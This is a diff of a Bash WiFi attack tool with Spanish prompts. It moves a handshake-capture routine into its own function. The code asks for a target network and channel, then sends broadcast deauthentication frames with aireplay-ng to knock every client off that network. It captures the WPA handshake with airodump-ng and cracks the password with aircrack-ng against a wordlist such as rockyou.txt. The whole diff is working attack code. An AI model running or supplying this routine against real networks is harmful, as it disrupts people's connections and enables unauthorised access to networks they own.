@@ -34,6 +34,60 @@ programs() {
 	done
 }
 
+handshake_ataque() {
+	clear
+								echo -e "\n${turquoiseColour}[*] Iniciando Ataque Handshake"
+								sleep 1
+								xterm -hold -e "airodump-ng ${tar}mon" &
+								airodump_xterm_PID=$!
+								echo -e "$grayColour"
+								tput cnorm
+								read -p "[?] Que red deseas atacar?: " ap
+								read -p "[?] En que canal esta ${ap}?: " channel
+								tput civis
+								$cleancolor
+								echo -e "${greenColour}[*] Se esta desautenticando a los usuarios de la red"
+								$cleancolor
+								kill -9 $airodump_xterm_PID
+								wait $airodump_xterm_PID 2>/dev/null
+
+								xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap ${tar}mon" &
+								airodump_filter_xterm_PID=$!
+
+								sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &								
+								aireplay_xterm_PID=$!
+								sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
+
+								echo -e "${redColour}\n[%] Esperando Handshake\n"
+								$cleancolor
+								
+								sleep 10; kill -9 $airodump_filter_xterm_PID
+								wait $airodump_filter_xterm_PID 2>/dev/null
+								test -f Handshake-01.cap
+								if [ "$(echo $?)" == "0" ]; then
+									tput cnorm
+									echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
+									read -p "[?] Ruta del Diccionario al usar: " dicc
+									$cleancolor; tput civis
+									xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"
+
+									echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
+									airmon-ng stop ${tar}mon > /dev/null 2>&1
+									sudo /etc/init.d/networking start > /dev/null 2>&1
+									sudo /etc/init.d/networking restart > /dev/null 2>&1
+									sudo systemctl start NetworkManager > /dev/null 2>&1
+									ifconfig $tar up > /dev/null 2>&1
+									sudo rm Handshake* > /dev/null 2>&1
+								else 
+									echo -e "${redColour}\n [!] No se ha capturado el Handshake"
+								fi
+}
+
+
+
+
+
+
 if [ $(id -u) -ne 0 ]; then
 	echo -e "$redColour\n[!] Debes ser root para ejecutar la herramienta -> (sudo $0)"
 	exit 1
@@ -92,52 +146,7 @@ else
 							$cleancolor
 							case $opcion in
 								1)
-								clear
-								echo -e "\n${turquoiseColour}[*] Iniciando Ataque Handshake"
-								sleep 1
-								xterm -hold -e "airodump-ng ${tar}mon" &
-								airodump_xterm_PID=$!
-								echo -e "$grayColour"
-								tput cnorm
-								read -p "[?] Que red deseas atacar?: " ap
-								read -p "[?] En que canal esta ${ap}?: " channel
-								tput civis
-								$cleancolor
-								echo -e "${greenColour}[*] Se esta desautenticando a los usuarios de la red"
-								$cleancolor
-								kill -9 $airodump_xterm_PID
-								wait $airodump_xterm_PID 2>/dev/null
-
-								xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap ${tar}mon" &
-								airodump_filter_xterm_PID=$!
-
-								sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &								
-								aireplay_xterm_PID=$!
-								sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
-
-								echo -e "${redColour}\n[%] Esperando Handshake\n"
-								$cleancolor
-								
-								sleep 10; kill -9 $airodump_filter_xterm_PID
-								wait $airodump_filter_xterm_PID 2>/dev/null
-								test -f Handshake-01.cap
-								if [ "$(echo $?)" == "0" ]; then
-									tput cnorm
-									echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
-									read -p "[?] Ruta del Diccionario al usar: " dicc
-									$cleancolor; tput civis
-									xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"
-
-									echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
-									airmon-ng stop ${tar}mon > /dev/null 2>&1
-									sudo /etc/init.d/networking start > /dev/null 2>&1
-									sudo /etc/init.d/networking restart > /dev/null 2>&1
-									sudo systemctl start NetworkManager > /dev/null 2>&1
-									ifconfig $tar up > /dev/null 2>&1
-									sudo rm Handshake* > /dev/null 2>&1
-								else 
-									echo -e "${redColour}\n [!] No se ha capturado el Handshake"
-								fi
+								handshake_ataque
 								;;
 								2)
 								clear
